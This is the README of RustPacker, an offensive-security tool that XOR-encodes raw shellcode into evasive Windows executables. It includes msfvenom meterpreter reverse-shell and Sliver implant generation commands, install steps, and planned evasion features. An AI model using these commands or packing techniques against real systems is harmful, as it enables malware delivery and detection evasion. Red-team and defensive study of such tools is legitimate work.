# RustPacker
Shellcode packer written in Rust.

## Current state
Functional as it packs a binary file, but very basic as it only supports XOR encoding for now.

## Are you a Rust developer?
If you have some experience with Rust, you're more than welcome to help !
You can help by:
- Review the code for mistakes / improvements
- Opening issues
- Contacting me on Discord for a more in depth review (nariod#4621)

# Quick start

## Podman/Docker setup
Consider using Podman instead of Docker for [security reasons](https://cloudnweb.dev/2019/10/heres-why-podman-is-more-secured-than-docker-devsecops/).
From any internet-connected OS with either Podman or Docker installed:
- `git clone https://github.com/Nariod/RustPacker.git`
- `cd RustPacker/`
- `podman build -t rustpacker -f Dockerfile`
- Paste your shellcode file in the `shared` folder
- `podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker -f shared/calc.bin -i ct -e xor`

For regular use, you can set an alias:
- On Linux host: `alias rustpacker='podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker'`
- Then: `rustpacker -f shared/calc.bin -i ct -e xor`

## Manual install on Kali
Install dependencies:
- `sudo apt update && sudo apt upgrade -y`
- `sudo apt install -y libssl-dev librust-openssl-dev musl-tools mingw-w64 cmake libxml2-dev`

Install Rust:
- `curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh `
- `source $HOME/.cargo/env`
- `rustup target add x86_64-pc-windows-gnu`

Run RustPacker:
- `git clone https://github.com/Nariod/RustPacker.git`
- `cd RustPacker/`
- `cargo run -- -f shellcode.bin -i ct -e xor`

# Full documentation

## Create shellcode
RustPacker is compatible with any "raw" shellcode.

### Metasploit / MSFvenom
You can generate raw MSF shellcode using msfvenom's raw format. Ex:
- `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=127.0.0.1 LPORT=80 -f raw -o msf.bin`

### Sliver
You can generate raw [Sliver](https://github.com/BishopFox/sliver) shellcode using Sliver's "--format shellcode". Ex:
- `generate --mtls 127.0.0.1:443 --format shellcode --windows --evasion`
- You can now use Shikata Ga Nai (SGN) Sliver encoder if prompted. RustPacker templates now use RWX memory regions, which are required for SGN to work.

## Install Rustpacker

### Podman/Docker setup
Consider using Podman instead of Docker for [security reasons](https://cloudnweb.dev/2019/10/heres-why-podman-is-more-secured-than-docker-devsecops/).
From any internet-connected OS with either Podman or Docker installed:
- `git clone https://github.com/Nariod/RustPacker.git`
- `cd RustPacker/`
- `podman build -t rustpacker -f Dockerfile`
- Paste your shellcode file in the `shared` folder
- `podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker -f shared/calc.bin -i ct -e xor`

For regular use, you can set an alias:
- On Linux host: `alias rustpacker='podman run --rm -v $(pwd)/shared:/usr/src/RustPacker/shared:z rustpacker RustPacker'`
- Then: `rustpacker -f shared/calc.bin -i ct -e xor`

### Manual install on Kali
Install dependencies:
- `sudo apt update && sudo apt upgrade -y`
- `sudo apt install -y libssl-dev librust-openssl-dev musl-tools mingw-w64 cmake libxml2-dev`

Install Rust:
- `curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh `
- `source $HOME/.cargo/env`
- `rustup target add x86_64-pc-windows-gnu`

Run RustPacker:
- `git clone https://github.com/Nariod/RustPacker.git`
- `cd RustPacker/`
- `cargo run -- -f shellcode.bin -i ct -e xor`

### Use Rustpacker

## Todo
- [X] Port createThread Rust template
- [X] Port createRemoteThread Rust template
- [X] Debug binary file to Vec<u8>
- [X] Debug compiler
- [X] Packer POC
- [X] Migrate to "std::include_bytes"
- [X] Add xor
- [ ] Add AES
- [X] Add Sliver SGN support
- [ ] Refactor code
- [X] Rewrite templates with Nt APIs
- [X] Build dockerfile
- [X] Strip output binaries
- [ ] Reduce cargo verbosity
- [ ] Generate random name for generated binary
- [ ] Add binary signing support
- [ ] Support the awesome evasions from https://github.com/memN0ps/mordor-rs
- [ ] Write detailed doc

## Credits
- Rust discord
- StackOverflow
- https://github.com/postrequest/link

## Legal disclaimer
Usage of anything presented in this repo to attack targets without prior mutual consent is illegal. It's the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program. Only use for educational purposes.
